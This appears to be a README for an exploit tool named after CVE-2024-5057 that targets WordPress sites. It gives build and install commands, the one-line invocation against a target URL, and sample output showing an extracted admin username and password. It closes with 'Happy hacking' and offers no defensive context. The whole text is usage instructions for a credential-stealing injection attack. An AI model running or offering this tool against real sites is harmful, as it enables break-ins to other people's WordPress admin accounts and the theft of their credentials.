# About

CVE-2024-5057

Let's try to inject and get the creds.


```bash
cd cve-2024-5057
./configure
make
make install
```

The expoit is installed as `/usr/local/bin/cve-2024-5057`.

So

```bash
cve-2024-5057 https://wp.example.com
```

where `https://wp.example.com` is a target Wordpress site.

# Result output

If the site is not vulnerable:

```text
The  site is not vulnerable
```

If the injection succeeded:

```text
username: Admin
password: Secret
```

returning username and password of the WP site admin.

**Happy hacking**
